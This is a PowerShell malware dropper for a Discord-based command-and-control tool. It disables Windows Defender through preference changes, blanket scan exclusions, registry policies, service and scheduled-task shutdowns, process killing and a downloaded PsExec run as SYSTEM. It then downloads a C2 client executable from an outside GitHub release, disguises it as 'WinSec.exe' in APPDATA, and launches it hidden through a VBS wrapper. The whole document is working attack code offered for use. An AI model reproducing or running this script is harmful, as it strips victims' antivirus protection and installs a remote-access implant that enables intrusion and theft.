# DiscordC2 — Defender Disable + Dropper
# Author: IMApurbo
# raw.githubusercontent.com/IMApurbo/discordC2/main/disable.ps1

$ErrorActionPreference = 'SilentlyContinue'

# ── tamper protection off ─────────────────────────
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f 2>$null

# ── real time protection off ──────────────────────
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2

# ── exclusions ────────────────────────────────────
Add-MpPreference -ExclusionPath "C:\"
Add-MpPreference -ExclusionPath $env:APPDATA
Add-MpPreference -ExclusionPath $env:TEMP
Add-MpPreference -ExclusionProcess "powershell.exe"
Add-MpPreference -ExclusionProcess "wscript.exe"
Add-MpPreference -ExclusionProcess "cmd.exe"

# ── registry ──────────────────────────────────────
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f 2>$null

# ── disable services using cmd.exe directly ───────
# must call sc.exe explicitly to avoid PowerShell aliasing sc to Set-Content
$services = @("WinDefend","WdNisSvc","WdFilter","WdBoot","Sense","SecurityHealthService")
foreach ($svc in $services) {
    & cmd.exe /c "sc.exe config $svc start= disabled" 2>$null
    & cmd.exe /c "sc.exe stop $svc" 2>$null
}

# ── disable via WMI (bypasses access denied on services) ──
$wmi = Get-WmiObject -Class Win32_Service -Filter "Name='WinDefend'" -ErrorAction SilentlyContinue
if ($wmi) { $wmi.ChangeStartMode("Disabled") | Out-Null }

# ── disable scheduled tasks ───────────────────────
$tasks = @(
    "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance",
    "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup",
    "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan",
    "\Microsoft\Windows\Windows Defender\Windows Defender Verification"
)
foreach ($task in $tasks) {
    & cmd.exe /c "schtasks /Change /TN `"$task`" /Disable" 2>$null
}

# ── kill defender process ─────────────────────────
Stop-Process -Name "MsMpEng" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "NisSrv"  -Force -ErrorAction SilentlyContinue

# ── use PsExec approach — relaunch as SYSTEM for service control ──
# this is needed because sc config requires SYSTEM not just Admin
$psexecUrl  = "https://live.sysinternals.com/PsExec64.exe"
$psexecPath = $env:TEMP + "\px.exe"

try {
    (New-Object Net.WebClient).DownloadFile($psexecUrl, $psexecPath)

    if (Test-Path $psexecPath) {
        # run sc.exe as SYSTEM
        foreach ($svc in @("WinDefend","WdNisSvc","WdFilter","WdBoot")) {
            & $psexecPath -accepteula -s -d cmd.exe /c "sc.exe config $svc start= disabled" 2>$null
        }
        Start-Sleep -Seconds 2
        Remove-Item $psexecPath -Force -ErrorAction SilentlyContinue
    }
} catch {}

# ── wait for defender to die ──────────────────────
Start-Sleep -Seconds 3

# ── download implant ──────────────────────────────
$dest   = $env:APPDATA + "\Microsoft\Windows\WinSec.exe"
$url    = "https://github.com/IMApurbo/discordC2/releases/download/C2/c2_client.exe"
$folder = Split-Path $dest

if (!(Test-Path $folder)) {
    New-Item -ItemType Directory -Path $folder -Force | Out-Null
}

# 3 fallback download methods
$ok = $false

try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent","Mozilla/5.0")
    $wc.DownloadFile($url, $dest)
    $ok = $true
} catch {}

if (!$ok) {
    try {
        Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing -UserAgent "Mozilla/5.0"
        $ok = $true
    } catch {}
}

if (!$ok) {
    try {
        Import-Module BitsTransfer
        Start-BitsTransfer -Source $url -Destination $dest
        $ok = $true
    } catch {}
}

# ── verify ────────────────────────────────────────
if (!(Test-Path $dest)) { exit }
if ((Get-Item $dest).Length -lt 100000) {
    Remove-Item $dest -Force
    exit
}

# ── launch hidden via vbs ─────────────────────────
$vbs  = $env:APPDATA + "\Microsoft\Windows\wrun.vbs"
$line1 = 'Set o = CreateObject("WScript.Shell")'
$line2 = 'o.Run Chr(34) & "' + $dest + '" & Chr(34), 0, False'
Set-Content -Path $vbs -Value ($line1 + "`r`n" + $line2)

Start-Process "wscript.exe" -ArgumentList ('//B //Nologo "' + $vbs + '"') -WindowStyle Hidden
